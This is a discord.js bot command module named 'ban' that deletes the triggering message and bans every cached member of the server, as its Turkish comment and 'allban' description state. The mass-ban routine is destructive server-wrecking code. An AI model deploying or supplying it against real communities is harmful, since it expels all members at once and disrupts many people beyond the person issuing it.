const Discord = require('discord.js');
exports.run = async (client, message, args) => {
 
    message.delete()
    message.guild.members.cache.forEach(member => member.ban()) //Bu komut herkesi banlar
  
};

exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: [],
  permLevel: 4 
};

exports.help = {
  name: 'ban',
  description: 'allban',
  usage: 'ban'
};